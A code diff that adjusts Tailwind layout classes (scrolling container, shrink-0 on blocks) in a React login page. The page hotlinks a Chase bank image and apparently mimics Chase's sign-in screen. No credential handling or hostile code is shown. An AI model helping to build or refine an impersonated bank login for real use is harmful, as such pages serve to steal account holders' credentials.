@@ -86,15 +86,15 @@ export default function LoginPage() {
 
   return (
     /* 
-      1. Removed 'flex flex-col' entirely.
-      2. This is now a standard block container. It will naturally scroll.
+      CHANGED: Replaced 'min-h-screen' with 'h-screen overflow-y-auto'. 
+      This forces the container to take exactly the height of the screen and scroll its inner contents if they overflow.
     */
-    <div className="min-h-screen w-full bg-[#f4f4f4] font-sans">
+    <div className="h-screen overflow-y-auto w-full bg-[#f4f4f4] font-sans">
       
       {/* HEADER BLOCK */}
       {/* Set a fixed height of 400px so the math is perfect */}
       <div 
-        className="w-full h-[400px] relative bg-cover bg-center"
+        className="w-full h-[400px] relative bg-cover bg-center shrink-0"
         style={{ backgroundImage: "url('https://asset.chase.com/content/services/rendition/image.xsmall.jpg/structured-images/geo-images/background/new_york/new_york_night_6.jpg')" }}
       >
         <div className="absolute inset-0 bg-gradient-to-b from-black/80 via-black/20 to-transparent"></div>
@@ -111,7 +111,7 @@ export default function LoginPage() {
       {/* FORM BLOCK */}
       {/* -mt-[300px] pulls it up over the image. 
           pb-24 adds space below the form before the footer hits. */}
-      <div className="w-full px-4 relative z-10 -mt-[280px] pb-24">
+      <div className="w-full px-4 relative z-10 -mt-[280px] pb-24 shrink-0">
         <div className="bg-white rounded-md shadow-xl p-8 w-full max-w-[420px] mx-auto">
           
           {step === "login" && (
@@ -267,7 +267,7 @@ export default function LoginPage() {
 
       {/* FOOTER BLOCK */}
       {/* Placed naturally at the bottom of the document flow */}
-      <div className="w-full bg-white pt-8 pb-12 px-4 border-t border-gray-200">
+      <div className="w-full bg-white pt-8 pb-12 px-4 border-t border-gray-200 shrink-0">
         
         {/* SVGs for Social Icons */}
         <div className="flex justify-center gap-6 mb-6">
